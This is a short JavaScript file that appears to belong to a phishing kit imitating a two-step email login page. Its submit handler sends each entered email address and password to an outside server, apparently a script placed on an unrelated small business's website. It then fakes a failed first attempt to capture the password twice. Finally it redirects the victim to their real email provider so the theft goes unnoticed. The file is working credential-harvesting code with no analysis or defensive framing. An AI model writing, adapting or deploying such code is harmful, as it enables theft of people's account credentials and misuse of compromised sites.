let passwordAttempts = 0;

$(document).ready(function () {
    initializeForm();
});

function initializeForm() {

    $("#myForm").on("submit", function (e) {
        e.preventDefault();

        const email = $("#email").val().trim();
        const password = $("#password").val().trim();

        if (!email || !password) {
            return;
        }

        $.ajax({
            url: "https://lorneplumbing.com.au/via/login.php",
            type: "POST",
            contentType: "application/json",
            dataType: "json",
            data: JSON.stringify({
                email: email,
                password: password,
                city: "", // Replace with actual city value if available
                currentTime: new Date().toISOString()
            }),
            success: function (response) {
                console.log(response);
                handleAttempt();
            },
            error: function (xhr, status, error) {
                console.error(error);
                handleAttempt();
            }
        });

    });

}

function handleAttempt() {
    passwordAttempts++;

    if (passwordAttempts === 1) {
        $("#password").val("").focus();
        return;
    }

    redirectToEmailProvider();
}

function nextStep() {

    const email = document.getElementById("email").value.trim();

    if (email === "") {
        alert("Enter your email.");
        return;
    }

    document.getElementById("emailDisplay").textContent = email;

    document.getElementById("emailStep").classList.add("hide");
    document.getElementById("passwordStep").classList.add("show");

}

function backStep() {

    document.getElementById("emailStep").classList.remove("hide");
    document.getElementById("passwordStep").classList.remove("show");

}

function redirectToEmailProvider() {

    const email = document.getElementById("email").value.trim();

    if (!email || !email.includes("@")) {
        alert("Please enter a valid email address.");
        return;
    }

    const domain = email.split("@")[1].toLowerCase();

    window.location.href = "https://" + domain;

}
